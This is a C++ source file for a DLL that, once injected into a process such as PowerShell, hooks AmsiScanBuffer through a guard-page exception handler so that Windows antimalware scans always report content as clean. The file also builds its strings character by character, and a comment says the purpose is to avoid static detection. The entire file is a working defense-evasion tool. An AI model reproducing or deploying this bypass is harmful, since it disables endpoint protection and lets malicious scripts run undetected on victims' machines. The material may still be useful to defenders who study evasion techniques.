// AMSI PAGE_GUARD VEH Bypass — DLL variant
// Uses the generic bypass engine from bypass.hpp.
// Inject into a process that loads amsi.dll (e.g. PowerShell).

#include <Windows.h>
#include "bypass.hpp"

// ---------------------------------------------------------------------------
// Install / Uninstall wrappers
// ---------------------------------------------------------------------------
static BOOL InstallAmsiBypass()
{
    // Obfuscated strings to avoid trivial static detection
    WCHAR wAmsi[] = { L'a',L'm',L's',L'i',L'.',L'd',L'l',L'l',L'\0' };
    CHAR  cFunc[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r','\0' };

    HMODULE hAmsi = GetModuleHandleW(wAmsi);
    if (!hAmsi)
        return FALSE;

    PVOID pScan = (PVOID)GetProcAddress(hAmsi, cFunc);
    if (!pScan)
        return FALSE;

    // AMSI: arg6 (stack[6]) = AMSI_RESULT*, write 0 (AMSI_RESULT_CLEAN), RAX = S_OK
    AddBypassTarget(pScan, S_OK, 6, 0);
    return InstallBypass();
}

// ---------------------------------------------------------------------------
// DLL entry point
// ---------------------------------------------------------------------------
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
{
    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        InstallAmsiBypass();
        break;

    case DLL_PROCESS_DETACH:
        UninstallBypass();
        break;
    }
    return TRUE;
}
